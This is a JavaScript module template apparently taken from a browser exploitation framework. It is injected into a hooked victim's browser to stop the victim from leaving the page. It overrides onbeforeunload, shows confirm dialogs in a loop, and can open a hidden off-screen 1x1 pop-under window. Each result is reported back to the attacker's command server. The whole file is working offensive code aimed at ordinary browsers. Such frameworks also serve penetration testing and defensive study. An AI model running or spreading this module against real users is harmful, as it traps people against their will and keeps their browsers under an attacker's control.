//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

    function display_confirm(){
        if(confirm("<%= @text %>")){
            display_confirm();
        }
    }

    function dontleave(e){
        e = e || window.event;

        var usePopUnder = '<%= @usePopUnder %>';
        if(usePopUnder) {
            var popunder_url = server.net.httpproto + '://' + server.net.host + ':' + server.net.port + '/demos/plain.html';
            var popunder_name = Math.random().toString(36).substring(2,10);
            server.debug("[Create Pop-Under] Creating window '" + popunder_name + "' for '" + popunder_url + "'");
            server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window requested');
            try {
                window.open(popunder_url,popunder_name,'toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=1,height=1,left='+screen.width+',top='+screen.height+'').blur();
                window.focus();
                server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window successfully created!', server.are.status_success());
            } catch(e) {
                server.debug("[Create Pop-Under] Could not create pop-under window");
                server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window was not created', server.are.status_error());
            }
        }

        if(server.browser.isIE()){
            e.cancelBubble = true;
            e.returnValue = "<%= @text %>";
        }else{
            if (e.stopPropagation) {
                e.stopPropagation();
                e.preventDefault();
                e.returnValue = "<%= @text %>";
            }
        }

        //re-display the confirm dialog if the user clicks OK (to leave the page)
        display_confirm();
        return "<%= @text %>";
    }

    window.onbeforeunload = dontleave;

	server.net.send('<%= @command_url %>', <%= @command_id %>, 'Module executed successfully');
});
